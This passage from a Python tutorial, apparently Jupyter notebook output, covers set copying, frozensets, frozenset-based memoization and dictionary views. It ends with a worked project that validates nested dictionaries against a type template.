Just as with other container types, we need to differentiate between shallow copies and deep copies.

Python sets implement a `copy` method that creates a shallow copy of the set. And, just as with lists, tuples, dictionaries, etc, we can also use unpacking to shallow copy sets. We can also just use the `set()` function to shallow copy one set into another.

Deep copies of sets can be done using the `deepcopy` function in the `copy` module.

The concepts and techniques are not new, so I won't spend much time on them.

#### Shallow Copies using the `copy` method

To illustrate the shallow copy vs deepcopy issues, we'll create our own mutable, but hashable type:


```
class Person:
    def __init__(self, name):
        self.name = name
    
    def __repr__(self):
        return f'Person(name={self.name})'
```


```
p1 = Person('John')
p2 = Person('Eric')
```


```
s1 = {p1, p2}
```


```
s1
```




    {Person(name=Eric), Person(name=John)}



Now let's make a shallow copy:


```
s2 = s1.copy()
```


```
s1 is s2
```




    False



As we can see the sets are not the same, however their contained elements **are**:


```
p1.name = 'John Cleese'
```


```
s1
```




    {Person(name=Eric), Person(name=John Cleese)}




```
s2
```




    {Person(name=Eric), Person(name=John Cleese)}



#### Shallow copies using unpacking

We can use unpacking, similar to iterable unpacking to unpack one set into another:


```
s3 = {*s2}
```


```
s3 is s2
```




    False




```
s3
```




    {Person(name=Eric), Person(name=John Cleese)}




```
p2.name = 'Eric Idle'
```


```
print(s1)
print(s2)
print(s3)
```

    {Person(name=John Cleese), Person(name=Eric Idle)}
    {Person(name=John Cleese), Person(name=Eric Idle)}
    {Person(name=John Cleese), Person(name=Eric Idle)}
    

#### Shallow copies using the `set()` function


```
s4 = set(s1)
```


```
s4 is s1
```




    False




```
s4
```




    {Person(name=Eric Idle), Person(name=John Cleese)}




```
p1.name = 'Michael Palin'
```


```
print(s1)
print(s2)
print(s3)
print(s4)
```

    {Person(name=Michael Palin), Person(name=Eric Idle)}
    {Person(name=Michael Palin), Person(name=Eric Idle)}
    {Person(name=Michael Palin), Person(name=Eric Idle)}
    {Person(name=Michael Palin), Person(name=Eric Idle)}
    

#### Deep Copies


```
from copy import deepcopy
```


```
s5 = deepcopy(s1)
```


```
s1 is s5
```




    False




```
s1
```




    {Person(name=Eric Idle), Person(name=Michael Palin)}




```
s5
```




    {Person(name=Eric Idle), Person(name=Michael Palin)}




```
p1.name = 'Terry Jones'
```


```
print(s1)
print(s2)
print(s3)
print(s4)
print(s5)
```

    {Person(name=Terry Jones), Person(name=Eric Idle)}
    {Person(name=Terry Jones), Person(name=Eric Idle)}
    {Person(name=Terry Jones), Person(name=Eric Idle)}
    {Person(name=Terry Jones), Person(name=Eric Idle)}
    {Person(name=Eric Idle), Person(name=Michael Palin)}
    

As you can see, the deep copy also made (deep) copies of each element in the set being (deep) copied.

##  Frozen Sets

`frozenset` is the **immutable** equivalent of the plain `set`.

Apart from the fact that you cannot mutate the collection (i.e. add or remove elements), the interesting thing is that frozen sets are hashable (as long as each contained element is also hashable).

This means that whereas we cannot create a set of sets, we can create a set of frozen sets (or a frozen set of frozen sets). It also means that we can use frozen sets as dictionary keys.

There is no literal for frozen sets - we have to use the `frozenset()` callable. It is used the same way to create frozensets that `set()` would be used to create sets.


```
s1 = {'a', 'b', 'c'}
```


```
hash(s1)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-2-790f99d9a225> in <module>
    ----> 1 hash(s1)
    

    TypeError: unhashable type: 'set'



```
s2 = frozenset(['a', 'b', 'c'])
```


```
hash(s2)
```




    -2484440409846998240



And we can create a set of frozen sets:


```
s3 = {frozenset({'a', 'b'}), frozenset([1, 2, 3])}
```


```
s3
```




    {frozenset({1, 2, 3}), frozenset({'a', 'b'})}



#### Copying Frozen Sets

Remember what happens when we create a shallow copy of a tuple using the `tuple()` callable?


```
t1 = (1, 2, [3, 4])
```


```
t2 = tuple(t1)
```


```
t1 is t2
```




    True



This is quite different from what happens with a list:


```
l1 = [1, 2, [3, 4]]
l2 = list(l1)
```


```
l1 is l2
```




    False



Remember that there's really no point in making a shallow copy of an immutable container - so, Python optimizes this for us and just returns the original tuple. Of course, lists are mutable, and that optimization cannot happen.

The same thing happens with sets and frozen sets:


```
s1 = {1, 2, 3}
s2 = set(s1)
s1 is s2
```




    False




```
s1 = frozenset([1, 2, 3])
s2 = frozenset(s1)
print(type(s1), type(s2), s1 is s2)
```

    <class 'frozenset'> <class 'frozenset'> True
    

Same goes with the `copy()` method:


```
s2 = s1.copy()
print(type(s1), type(s2), s1 is s2)
```

    <class 'frozenset'> <class 'frozenset'> True
    

Of course, this will not happen with a deep copy in general:


```
from copy import deepcopy
```


```
s2 = deepcopy(s1)
print(type(s1), type(s2), s1 is s2)
```

    <class 'frozenset'> <class 'frozenset'> False
    

#### Set Operations

All the non-mutating set operations we studied with sets also apply to frozen sets.

But, in addition, we can mix sets and frozen sets when performing these operations.

For example:


```
s1 = frozenset({'a', 'b'})
s2 = {1, 2}
s3 = s1 | s2
```


```
s3
```




    frozenset({1, 2, 'a', 'b'})



What's important to note here is the data type of the result - it is a frozen set.
Let's do this operation again, but switch around `s1` and `s2`:


```
s3 = s2 | s1
```


```
s3
```




    {1, 2, 'a', 'b'}



As you can see, the result is now a standard set.

Basically the data type of the first operand determines the data type of the result.


```
s1 = frozenset({'a', 'b', 'c'})
s2 = {'c', 'd', 'e'}
```


```
s1 & s2
```




    frozenset({'c'})




```
s2 & s1
```




    {'c'}



Same goes with differences and symmetric differences:


```
s1 - s2
```




    frozenset({'a', 'b'})




```
s2 - s1
```




    {'d', 'e'}




```
s1 ^ s2
```




    frozenset({'a', 'b', 'd', 'e'})




```
s2 ^ s1
```




    {'a', 'b', 'd', 'e'}



What about equality?


```
s1 = {1, 2}
s2 = frozenset(s1)
```


```
s1 is s2
```




    False




```
s1 == s2
```




    True



As you can see, this is very similar behavior to numerical values:


```
1 == 1.0
```




    True




```
1 == 1 + 0j
```




    True



Even though they are not the same data type (and hence cannot possibly be the same object), equality still works "as expected".

##### Application 1

One application of frozen sets, assuming they are hashable, is as keys for a dictionary.

Recall an example we worked on in the past where we wanted a `Person` object to be used as a key in a dictionary.

We had to define the class, equality and the hash - that was quite a bit of work for what amounted to, in the end just checking that the name and age were the same.

Of course, we may have more complex instances of this, but for a simple case like that, especially if we consider our `Person` class to be immutable, it would have been easier to just use a frozen set containing the name and age:


```
class Person:
    def __init__(self, name, age):
        self._name = name
        self._age = age
        
    def __repr__(self):
        return f'Person(name={self._name}, age={self._age})'
    
    @property
    def name(self):
        return self._name
        
    @property
    def age(self):
        return self._age
    
    def key(self):
        return frozenset({self.name, self.age})
```


```
p1 = Person('John', 78)
p2 = Person('Eric', 75)
```


```
d = {p1.key(): p1, p2.key(): p2}
```


```
d
```




    {frozenset({78, 'John'}): Person(name=John, age=78),
     frozenset({75, 'Eric'}): Person(name=Eric, age=75)}



And we can easily lookup using those keys now:


```
d[frozenset({'John', 78})]
```




    Person(name=John, age=78)




```
d[frozenset({78, 'John'})]
```




    Person(name=John, age=78)



Of course this is kind of a limited use case, but in the event you have the need to use sets as dictionary keys, then you technically can using a frozen set (as long as the elements are all hashable).

##### Application 2

A slightly more interesting application of this is memoization. I cover memoization in detail in Part 1 of this series in the section on decorators.

Recall that memoization is basically a technique to cache the results of a (deterministic) function call based on the provided arguments. A cache is created that contains the results of calling the function with a particular set of arguments, the next time the function is called, the arguments are checked against the cache - if the arguments exist in the cache, then the cached value is returned instead of re-executing the function.

Although Python's `functools` has the `lru_cache` decorator available, there is one drawback - the order of the keyword arguments matters.

Let's see this:


```
from functools import lru_cache
```


```
@lru_cache()
def my_func(*, a, b):
    print('calculating a+b...')
    return a + b
```


```
my_func(a=1, b=2)
```

    calculating a+b...
    




    3




```
my_func(a=1, b=2)
```




    3



Notice how the second time around, we did not see `calculating a+b...` printed out - that's because the value was pulled from cache.

But now look at this:


```
my_func(b=2, a=1)
```

    calculating a+b...
    




    3



Even though the values are technically the same, the order in which we specified them as different, and the cache considered the arguments to be different. Now of course, both "styles" are cached:


```
my_func(a=1, b=2)
my_func(b=2, a=1)
```




    3



An interesting side note, now that we know all about hashability!
You'll notice that the way `my_func` works we can actually pass in other data types than just numbers. We could use strings, tuples, even lists or sets:


```
my_func(a='abc', b='def')
```

    calculating a+b...
    




    'abcdef'




```
my_func(a='abc', b='def')
```




    'abcdef'



As you can see caching works just fine.
But what is being used to back the cache for `lru_cache`? A dictionary...
And what do we know about dictionary keys? They must be hashable!

So this will actually fail, and not because the function can't handle it, but because the `lru_cache` mechanism cannot:


```
my_func(a=[1, 2, 3], b=[4, 5, 6])
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-47-4d35b0a99654> in <module>
    ----> 1 my_func(a=[1, 2, 3], b=[4, 5, 6])
    

    TypeError: unhashable type: 'list'


Let's write our own version of this.
We'll use a dictionary to cache the arguments - so we'll need to come up with a key representing the arguments - and one in which the order of the keyword-only arguments does not matter. We'll have the same limitation in terms of hashable keys as `lru_cache`, but at least we won't have the argument ordering issue:


```
def memoizer(fn):
    cache = {}
    def inner(*args, **kwargs):
        key = (*args, frozenset(kwargs.items()))
        if key in cache:
            return cache[key]
        else:
            result = fn(*args, **kwargs)
            cache[key] = result
            return result
    return inner
```


```
@memoizer
def my_func(*, a, b):
    print('calculating a+b...')
    return a + b
```


```
my_func(a=1, b=2)
```

    calculating a+b...
    




    3




```
my_func(a=1, b=2)
```




    3



So far so good... Now let's swap the arguments around:


```
my_func(b=2, a=1)
```




    3



Yay!! It used the cache!

We can even tweak this to effectively provide more efficient caching when the order of positional arguments is not important either:


```
def memoizer(fn):
    cache = {}
    def inner(*args, **kwargs):
        key = frozenset(args) | frozenset(kwargs.items())
        if key in cache:
            return cache[key]
        else:
            result = fn(*args, **kwargs)
            cache[key] = result
            return result
    return inner
```


```
@memoizer
def adder(*args):
    print('calculating...')
    return sum(args)
```


```
adder(1, 2, 3)
```

    calculating...
    




    6




```
adder(3, 2, 1)
```




    6




```
adder(2, 1, 3)
```




    6




```
adder(1, 2, 3, 4)
```

    calculating...
    




    10




```
adder(4, 2, 1, 3)
```




    10



Isn't Python fun!!

##  Views: Keys, Values and Items

#### Views are not Static

These view objects are not static - so it's not like Python makes a copy of the keys, values or items, and uses these static copies. They are like windows (views) into the **current** state of the dictionary. If the dictionary changes, then these views reflect those changes immediately.

Basically these views provide methods that access the underlying dictionary. They do not "own" any data.


```
d = {'a': 1, 'b': 2}
```


```
keys = d.keys()
values = d.values()
items = d.items()
```


```
print(id(keys), id(values), id(items))
```

    4347984680 4347985016 4347985064
    


```
print(keys)
print(values)
print(items)
```

    dict_keys(['a', 'b'])
    dict_values([1, 2])
    dict_items([('a', 1), ('b', 2)])
    


```
d['z'] = 100
```


```
print(id(keys), id(values), id(items))
```

    4347984680 4347985016 4347985064
    

As you can see the memory address of these view objects has not changed:


```
print(keys)
print(values)
print(items)
```

    dict_keys(['a', 'b', 'z'])
    dict_values([1, 2, 100])
    dict_items([('a', 1), ('b', 2), ('z', 100)])
    

but the view 'contents' have changed. These views are **dynamic**.

#### Mutating a dictionary while iterating over these views

Because these views instantly reflect any modifications made to the underlying dictionary, we have to be careful changing the dictionary while we iterate over a view! 


```
d = {'a': 1, 'b': 2, 'c': 3}
```


```
for k, v in d.items():
    print(k, v)
    del d[k]
```

    a 1
    


    ---------------------------------------------------------------------------

    RuntimeError                              Traceback (most recent call last)

    <ipython-input-9-0c55998ae97c> in <module>
    ----> 1 for k, v in d.items():
          2     print(k, v)
          3     del d[k]
    

    RuntimeError: dictionary changed size during iteration


As you can see Python complains about this. But the interesting thing is that Python does not complain about the deletion itself - notice where the exception occurs - at the loop, not the delete statement.

In fact, the dictionary **has** changed:


```
d
```




    {'b': 2, 'c': 3}



As you can see the key `a` is gone.

So the deletion happens just fine, but when Python continues the loop, at that point it detects that the dictionary has changed - and an exception is raised at that point. But notice the exception message - Python is complaining about the **size** of the dictionary changing... 
We'll come back to that point in a minute.

What about insertions, will Python complain about it?


```
d = {'a': 1, 'b': 2, 'c': 3}
for k, v in d.items():
    print(k, v)
    d['z'] = 100
```

    a 1
    


    ---------------------------------------------------------------------------

    RuntimeError                              Traceback (most recent call last)

    <ipython-input-11-e0c7f15f83b9> in <module>
          1 d = {'a': 1, 'b': 2, 'c': 3}
    ----> 2 for k, v in d.items():
          3     print(k, v)
          4     d['z'] = 100
    

    RuntimeError: dictionary changed size during iteration


No, that's not allowed either.

It is perfectly fine to modify the values though:


```
d = {'a': 1, 'b': 2, 'c': 3}
for k, v in d.items():
    print(k, v)
    d[k] = 1000
```

    a 1
    b 2
    c 3
    

and of course our dictionary values have changed:


```
d
```




    {'a': 1000, 'b': 1000, 'c': 1000}



What about the other views, are they more tolerant of underlying mutations? We would not expect the key view to allow this, but what about the values view? After all it is not referencing the keys at all...


```
d = {'a': 1, 'b': 2, 'c': 3}
for v in d.values():
    print(v)
    del d['a']
```

    1
    


    ---------------------------------------------------------------------------

    RuntimeError                              Traceback (most recent call last)

    <ipython-input-14-3c084c806922> in <module>
          1 d = {'a': 1, 'b': 2, 'c': 3}
    ----> 2 for v in d.values():
          3     print(v)
          4     del d['a']
    

    RuntimeError: dictionary changed size during iteration


No, not allowed either! We just cannot change the size of the dictionary (and hence the size of the view too) while iterating over it.

So, if that's the limitation, then we should be able to modify the values of elements as we iterate over the keys:


```
d = {'a': 1, 'b': 2, 'c': 3}
```


```
for key in d.keys():
    d[key] = 100
```


```
d
```




    {'a': 100, 'b': 100, 'c': 100}



Even this will work fine:


```
for k, v in d.items():
    d[k] = v * 2
```


```
d
```




    {'a': 200, 'b': 200, 'c': 200}



The moral here is that you should not manipulate the keys of a dictionary as you iterate over it - either directly, or using the views.
Mutating associated values is perfectly fine.

#### Iterating over a dictionary vs iterating over the keys view

As we just mentioned, dictionaries implement the iterable protocol which iterates over the keys of the dictionary:


```
d = dict.fromkeys('python', 0)
```


```
for k in d:
    print(k)
```

    p
    y
    t
    h
    o
    n
    

This would be the same as requesting the iterator from the dictionary and using the iterator:


```
d_iter = iter(d)
for k in d_iter:
    print(k)
```

    p
    y
    t
    h
    o
    n
    

So, you may very well be asking yourself whether we should iterate keys using the dictionaries iterator, or using the key view? After all it seems to do the same thing...

And yes, either one would be just fine for iterating over the keys of a dictionary. Let's just make sure the performance is about the same:


```
from timeit import timeit
from random import randint

d = {k: randint(0, 100) for k in range(10_000)}
keys = d.keys()

def iter_direct(d):
    for k in d:
        pass
    
def iter_view(d):
    for k in d.keys():
        pass

def iter_view_direct(view):
    for k in view:
        pass
    
print(timeit('iter_direct(d)', globals=globals(), number=20_000))
print(timeit('iter_view(d)', globals=globals(), number=20_000))
print(timeit('iter_view_direct(keys)', globals=globals(), number=20_000))
```

    1.857292921980843
    1.8094384070136584
    1.8164116419502534
    

As you can see, unless you are re-creating a new view object every time, the performance difference between iterating via the dictionary's iterator and the view's iterator is about the same. [In fact, it's the same iterator in both cases!] 
But since there is really no need to re-create a view once it's been created (since is is dynamic), the overhead of creating the `keys` view is a one-time hit.
And a `keys` view provides far more functionality than just iteration - as we know it behaves like a set - so if you need to perform set operations on the keys you'll need to use the `keys` view.

#### Iterating over keys and values

As we saw, we can use the `.items()` view to iterate over both the keys and values of a dictionary.


```
d = {'a': 1, 'b': 2, 'c': 3}
```


```
for k, v in d.items():
    print(k, v)
```

    a 1
    b 2
    c 3
    

You might be tempted to do it this way as well:


```
for k in d:
    print(k, d[k])
```

    a 1
    b 2
    c 3
    

But this is quite inefficient!
Let's try some timings.


```
d = {k: randint(0, 100) for k in range(10_000)}
items = d.items()

def iterate_view(view):
    for k, v in view:
        pass
    
def iterate_clunky(d):
    for k in d:
        d[k]
        
print(timeit('iterate_view(items)', globals=globals(), number=5_000))
print(timeit('iterate_clunky(d)', globals=globals(), number=5_000))
```

    0.8359718360006809
    1.3389352719532326
    

As you can see, it is substantially slower to iterate over both the keys and the values of the dictionary using the second approach. This is because in the second approach, we have to perform a lot of dictionary lookups - while lookups are particularlay efficient in Python, they are slower than not doing a lookup at all!

#### Iterating a dictionary while mutating keys

As we mentioned earlier, we cannot mutate a dictionary's keys while iterating over it:

Let's see an example of this:


```
d = {'a': 1, 'b': 2, 'c': 3}
for k, v in d.items():
    print(k, v ** 2)
    del d[k]
```

    a 1
    


    ---------------------------------------------------------------------------

    RuntimeError                              Traceback (most recent call last)

    <ipython-input-28-f3a5d6ff22d2> in <module>
          1 d = {'a': 1, 'b': 2, 'c': 3}
    ----> 2 for k, v in d.items():
          3     print(k, v ** 2)
          4     del d[k]
    

    RuntimeError: dictionary changed size during iteration


One way to solve this is to create a static list of all the keys, and iterate over that instead:


```
d = {'a': 1, 'b': 2, 'c': 3}
keys = list(d.keys())
print(keys)
```

    ['a', 'b', 'c']
    


```
for k in keys:
    value = d.pop(k)
    print(f'{value} ** 2 = {value ** 2}')
```

    1 ** 2 = 1
    2 ** 2 = 4
    3 ** 2 = 9
    


```
d
```




    {}



Another way would be to use the `popitem` method. We just need to know how many times we can call `popitem`, or catch the `KeyError` exception when it occurs:


```
d = {'a':1, 'b':2, 'c':3}
for _ in range(len(d)):
    key, value = d.popitem()
    print(key, value, value**2)
```

    c 3 9
    b 2 4
    a 1 1
    

Or we can use a `while` loop:


```
d = {'a':1, 'b':2, 'c':3}
while len(d) > 0:
    key, value = d.popitem()
    print(key, value, value**2)
```

    c 3 9
    b 2 4
    a 1 1
    

Or we can simply keep iterating indefinitely until a `KeyError` exception occurs:


```
d = {'a':1, 'b':2, 'c':3}
while True:
    try:
        key, value = d.popitem()
    except KeyError:
        break
    else:
        print(key, value, value**2)
```

    c 3 9
    b 2 4
    a 1 1
    

# Section 06 - Project 1

##  Project 1

In this project our goal is to validate one dictionary structure against a template dictionary.

A typical example of this might be working with JSON data inputs in an API. You are trying to validate this received JSON against some kind of template to make sure the received JSON conforms to that template (i.e. all the keys and structure are identical - value types being important, but not the value itself - so just the structure, and the data type of the values).

To keep things simple we'll assume that values can be either single values (like an integer, string, etc), or a dictionary, itself only containing single values or other dictionaries, recursively. In other words, we're not going to deal with lists as possible values. Also, to keep things simple, we'll assume that all keys are **required**, and that no extra keys are permitted.

In practice we would not have these simplifying assumptions, and although we could definitely write this ourselves, there are many 3rd party libraries that already exist to do this (such as `jsonschema`, `marshmallow`, and many more, some of which I'll cover lightly in some later videos.)

For example you might have this template:


```
template = {
    'user_id': int,
    'name': {
        'first': str,
        'last': str
    },
    'bio': {
        'dob': {
            'year': int,
            'month': int,
            'day': int
        },
        'birthplace': {
            'country': str,
            'city': str
        }
    }
}
```

So, a JSON document such as this would match the template:


```
john = {
    'user_id': 100,
    'name': {
        'first': 'John',
        'last': 'Cleese'
    },
    'bio': {
        'dob': {
            'year': 1939,
            'month': 11,
            'day': 27
        },
        'birthplace': {
            'country': 'United Kingdom',
            'city': 'Weston-super-Mare'
        }
    }
}
```

But this one would **not** match the template (missing key):


```
eric = {
    'user_id': 101,
    'name': {
        'first': 'Eric',
        'last': 'Idle'
    },
    'bio': {
        'dob': {
            'year': 1943,
            'month': 3,
            'day': 29
        },
        'birthplace': {
            'country': 'United Kingdom'
        }
    }
}
```

And neither would this one (wrong data type):


```
michael = {
    'user_id': 102,
    'name': {
        'first': 'Michael',
        'last': 'Palin'
    },
    'bio': {
        'dob': {
            'year': 1943,
            'month': 'May',
            'day': 5
        },
        'birthplace': {
            'country': 'United Kingdom',
            'city': 'Sheffield'
        }
    }
}
```

Write a function such this:


```
def validate(data, template):
    # implement
    # and return True/False
    # in the case of False, return a string describing 
    # the first error encountered
    # in the case of True, string can be empty
    return state, error
```

That should return this:
* `validate(john, template) --> True, ''`
* `validate(eric, template) --> False, 'mismatched keys: bio.birthplace.city'`
* `validate(michael, template) --> False, 'bad type: bio.dob.month'`

Better yet, use exceptions instead of return codes and strings!

##  Project 1 - Solution

In this project our goal is to validate one dictionary structure against a template dictionary.

A typical example of this might be working with JSON data inputs in an API. You are trying to validate this received JSON against some kind of template to make sure the received JSON conforms to that template (i.e. all the keys and structure are identical - value types being important, but not the value itself - so just the structure, and the data type of the values).

To keep things simple we'll assume that values can be either single values (like an integer, string, etc), or a dictionary, itself only containing single values or other dictionaries, recursively. In other words, we're not going to deal with lists as possible values. Also, to keep things simple, we'll assume that all keys are **required**, and that no extra keys are permitted.

In practice we would not have these simplifying assumptions, and although we could definitely write this ourselves, there are many 3rd party libraries that already exist to do this (such as `jsonschema`, `marshmallow`, and many more, some of which I'll cover lightly in some later videos.)

For example you might have this template:


```
template = {
    'user_id': int,
    'name': {
        'first': str,
        'last': str
    },
    'bio': {
        'dob': {
            'year': int,
            'month': int,
            'day': int
        },
        'birthplace': {
            'country': str,
            'city': str
        }
    }
}
```

So, a JSON document such as this would match the template:


```
john = {
    'user_id': 100,
    'name': {
        'first': 'John',
        'last': 'Cleese'
    },
    'bio': {
        'dob': {
            'year': 1939,
            'month': 11,
            'day': 27
        },
        'birthplace': {
            'country': 'United Kingdom',
            'city': 'Weston-super-Mare'
        }
    }
}
```

But this one would **not** match the template (missing key):


```
eric = {
    'user_id': 101,
    'name': {
        'first': 'Eric',
        'last': 'Idle'
    },
    'bio': {
        'dob': {
            'year': 1943,
            'month': 3,
            'day': 29
        },
        'birthplace': {
            'country': 'United Kingdom'
        }
    }
}
```

And neither would this one (wrong data type):


```
michael = {
    'user_id': 102,
    'name': {
        'first': 'Michael',
        'last': 'Palin'
    },
    'bio': {
        'dob': {
            'year': 1943,
            'month': 'May',
            'day': 5
        },
        'birthplace': {
            'country': 'United Kingdom',
            'city': 'Sheffield'
        }
    }
}
```

Write a function such this:


```
def validate(data, template):
    # implement
    # and return True/False
    # in the case of False, return a string describing 
    # the first error encountered
    # in the case of True, string can be empty
    return state, error
```

That should return this:
* `validate(john, template) --> True, ''`
* `validate(eric, template) --> False, 'mismatched keys: bio.birthplace.city'`
* `validate(michael, template) --> False, 'bad type: bio.dob.month'`

##### Solution

There are many ways to approach this, but a recursive approach here will probably be simpler (not simple, just simpl**er**!) since we want to write a function that does not make any assumptions about how many dictionaries are nested.

My approach is going to be as follows:
1. Write a recursive function
2. Maintain a breadcrumb (or *path*) of where we're at in the nested dictionaries (e.g. `bio.birthplace`)
3. Check to make sure all the required keys from the template are present in the data (for the same level)
4. For dictionary valued keys, recursively call my function
5. For non-dictionary values make sure they are of the correct type

I'm going to build this function up little by little.

Let's first start by determining if we have mismatched keys: missing keys required by template, or extra keys in data not specified by template:


```
def match_keys(data, valid, path):
    # path is just a string containing the current path
    # that we can use to append the extra/missing keys
    # and create a full path for the mismatched keys
    data_keys = data.keys()
    valid_keys = valid.keys()
    # we could just use data_keys ^ valid_keys
    # to get mismatched keys, but I prefer to differentiate
    # between missing and extra keys separately
    extra_keys = data_keys - valid_keys
    missing_keys = valid_keys - data_keys
    # Finally, build up the error state and message
    if missing_keys or extra_keys:
        is_ok = False
        missing_msg = ('missing keys:' +
                       ','.join({path + '.' + str(key) 
                                 for key in missing_keys})
                      ) if missing_keys else ''
        extras_msg = ('extra keys:' + 
                     ','.join({path + '.' + str(key) 
                               for key in extra_keys})
                     ) if extra_keys else ''
        return False, ' '.join((missing_msg, extras_msg))
    else:
        return True, None
```

Let's test this function out:


```
t = {'a': int, 'b': int, 'c': int, 'd': int}
d = {'a': 'wrong type', 'b': 100, 'c': 200, 'd': {'wrong': 'type'}}
is_ok, err_msg = match_keys(d, t, 'some.path')
print(is_ok, err_msg)
```

    True None
    


```
d = {'a': 'test', 'b': 'test', 'c': 'test'}
is_ok, err_msg = match_keys(d, t, 'some.path')
print(is_ok, err_msg)
```

    False missing keys:some.path.d 
    


```
d = {'a': 'test', 'b': 'test', 'c': 'test', 'd': 'test', 'z': 'extra'}
is_ok, err_msg = match_keys(d, t, 'some.path')
print(is_ok, err_msg)
```

    False  extra keys:some.path.z
    


```
d = {'a': 'test', 'b': 'test', 'z': 'extra'}
is_ok, err_msg = match_keys(d, t, 'some.path')
print(is_ok, err_msg)
```

    False missing keys:some.path.d,some.path.c extra keys:some.path.z
    

OK, so now let's write a function that matches the types of corresponding (could be an actual type, or a nested dictionary):


```
def match_types(data, template, path):
    # assume here that the keys have already been matched OK
    # but do not assume that the keys are necessarily in the same
    # order in both the data and the template
    for key, value in template.items():
        if isinstance(value, dict):
            template_type = dict
        else:
            template_type = value
        data_value = data.get(key, object())
        if not isinstance(data_value, template_type):
            err_msg = ('incorrect type: ' + path + '.' + key +
                       ' -> expected ' + template_type.__name__ +
                       ', found ' + type(data_value).__name__)
            return False, err_msg
    return True, None        
```

Let's test this one out:


```
t = {'a': int, 'b': str, 'c': {'d': int}}
d = {'a': 100, 'b': 'test', 'c': {'some': 'dict'}}
match_types(d, t, 'some.path')
```




    (True, None)




```
d = {'a': 100, 'b': 'test', 'c': 'unexpected'}
match_types(d, t, 'some.path')
```




    (False, 'incorrect type: some.path.c -> expected dict, found str')




```
d = {'a': 100, 'b': 200, 'c': {'some': 'dict'}}
match_types(d, t, 'some.path')
```




    (False, 'incorrect type: some.path.b -> expected str, found int')



OK, so far so good!

Now it's time to combine these into our main recursive function:


```
def recurse_validate(data, template, path):
    # validate keys match
    is_ok, err_msg = match_keys(data, template, path)
    if not is_ok:
        return False, err_msg

    # validate individual data types match
    is_ok, err_msg = match_types(data, template, path)
    if not is_ok:
        return False, err_msg
    
    # Now see if we have nested dictionaries in template
    # (or data, since we know both keys and value data types match)
    dictionary_type_keys = {key for key, value in template.items()
                           if isinstance(value, dict)}
    for key in dictionary_type_keys:
        sub_path = path + '.' + str(key)
        sub_template = template[key]
        sub_data = data[key]
        is_ok, err_msg = recurse_validate(sub_data, sub_template, sub_path)
        if not is_ok:
            return False, err_msg
        
    return True, None
```

Now let's test this function:


```
is_ok, err_msg = recurse_validate(john, template, 'root')
print(is_ok, err_msg)
```

    True None
    


```
is_ok, err_msg = recurse_validate(eric, template, 'root')
print(is_ok, err_msg)
```

    False missing keys:root.bio.birthplace.city 
    


```
is_ok, err_msg = recurse_validate(michael, template, 'root')
print(is_ok, err_msg)
```

    False incorrect type: root.bio.dob.month -> expected int, found str
    

Nice, now all that's left is to write our main function - it's only role really is to hide the recursive function from the caller, and provide a "start" path (which should be empty):


```
def validate(data, template):
    return recurse_validate(data, template, '')
```


```
persons = ((john, 'John'), (eric, 'Eric'), (michael, 'Michael'))
```


```
for person, name in persons:
    is_ok, err_msg = validate(person, template)
    print(f'{name}: valid={is_ok}: {err_msg}')
```

    John: valid=True: None
    Eric: valid=False: missing keys:.bio.birthplace.city 
    Michael: valid=False: incorrect type: .bio.dob.month -> expected int, found str
    

As an additional tweak, I'm not going to return a tuple with the sate and the error message, instead I'm going to use exceptions to do the same thing:


```
class SchemaError(Exception):
    pass

def validate(data, template):
    is_ok, err_msg = recurse_validate(data, template, '')
    if not is_ok:
        raise SchemaError(err_msg)
```

Then we can use the validator this way:


```
validate(john, template)
```


```
validate(eric, template)
```


    ---------------------------------------------------------------------------

    SchemaError                               Traceback (most recent call last)

    <ipython-input-24-d8dab4322d43> in <module>
    ----> 1 validate(eric, template)
    

    <ipython-input-22-a7e05a2dc52f> in validate(data, template)
          5     is_ok, err_msg = recurse_validate(data, template, '')
          6     if not is_ok:
    ----> 7         raise SchemaError(err_msg)
    

    SchemaError: missing keys:.bio.birthplace.city 



```
validate(michael, template)
```


    ---------------------------------------------------------------------------

    SchemaError                               Traceback (most recent call last)

    <ipython-input-25-c6911eeab1d6> in <module>
    ----> 1 validate(michael, template)
    

    <ipython-input-22-a7e05a2dc52f> in validate(data, template)
          5     is_ok, err_msg = recurse_validate(data, template, '')
          6     if not is_ok:
    ----> 7         raise SchemaError(err_msg)
    

    SchemaError: incorrect type: .bio.dob.month -> expected int, found str


Of course, we could use this approach throughout instead of returning a status and an exception - this would make this a bit cleaner, and we can also differentiate between key mismatches vs value mismatches:


```
class SchemaError(Exception):
    pass

class SchemaKeyMismatch(SchemaError):
    pass

class SchemaTypeMismatch(SchemaError, TypeError):
    pass
```


```
def match_keys(data, valid, path):
    # path is just a string containing the current path
    # that we can use to append the extra/missing keys
    # and create a full path for the mismatched keys
    data_keys = data.keys()
    valid_keys = valid.keys()
    # we could just use data_keys ^ valid_keys
    # to get mismatched keys, but I prefer to differentiate
    # between missing and extra keys separately
    extra_keys = data_keys - valid_keys
    missing_keys = valid_keys - data_keys
    # Finally, build up the error state and message
    if missing_keys or extra_keys:
        is_ok = False
        missing_msg = ('missing keys:' +
                       ','.join({path + '.' + str(key) 
                                 for key in missing_keys})
                      ) if missing_keys else ''
        extras_msg = ('extra keys:' + 
                     ','.join({path + '.' + str(key) 
                               for key in extra_keys})
                     ) if extra_keys else ''
        raise SchemaKeyMismatch(' '.join((missing_msg, extras_msg)))
```


```
def match_types(data, template, path):
    # assume here that the keys have already been matched OK
    # but do not assume that the keys are necessarily in the same
    # order in both the data and the template
    for key, value in template.items():
        if isinstance(value, dict):
            template_type = dict
        else:
            template_type = value
        data_value = data.get(key, object())
        if isinstance(data_value, template_type):
            continue
        else:
            err_msg = ('incorrect type: ' + path + '.' + key +
                       ' -> expected ' + template_type.__name__ +
                       ', found ' + type(data_value).__name__)
            raise SchemaTypeMismatch(err_msg)
```


```
def recurse_validate(data, template, path):
    match_keys(data, template, path)
    match_types(data, template, path)

    # Now see if we have nested dictionaries in template
    # (or data, since we know both keys and value data types match)
    dictionary_type_keys = {key for key, value in template.items()
                           if isinstance(value, dict)}
    for key in dictionary_type_keys:
        sub_path = path + '.' + str(key)
        sub_template = template[key]
        sub_data = data[key]
        recurse_validate(sub_data, sub_template, sub_path)
```


```
def validate(data, template):
    recurse_validate(data, template, '')
```


```
validate(john, template)
```


```
validate(eric, template)
```


    ---------------------------------------------------------------------------

    SchemaKeyMismatch                         Traceback (most recent call last)

    <ipython-input-32-d8dab4322d43> in <module>
    ----> 1 validate(eric, template)
    

